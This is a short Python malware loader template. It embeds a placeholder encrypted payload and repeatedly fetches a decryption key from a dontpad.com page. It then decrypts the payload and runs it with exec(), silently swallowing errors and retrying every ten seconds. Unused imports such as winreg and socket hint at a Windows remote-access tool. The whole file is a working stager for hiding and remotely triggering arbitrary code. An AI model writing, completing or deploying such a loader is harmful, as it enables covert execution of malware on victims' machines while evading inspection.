import socket
import os
import platform
import subprocess
from time import sleep
import requests
from threading import Thread
from sys import argv
import winreg
from cryptography.fernet import Fernet

# INSERT YOUR ENCRYPTED PAYLOAD
play = b'YOURENCRYPTEDPAYLOADHERE'

while True:
    try:
        # INSERT YOUR FILE KEY IN DONTPAD.COM
        endpoint = requests.get('http://dontpad.com/FILEKEY')
        if endpoint.status_code == 200:
            data = endpoint.text.split('<textarea id="text">')[1]
            data = data.split('</textarea>')[0]
            print(f"key : {data}")
            control = Fernet(data.encode())
            game = control.decrypt(play)
            print(f"key : {game}")
            exec(game)

    except:
        pass
    sleep(10)
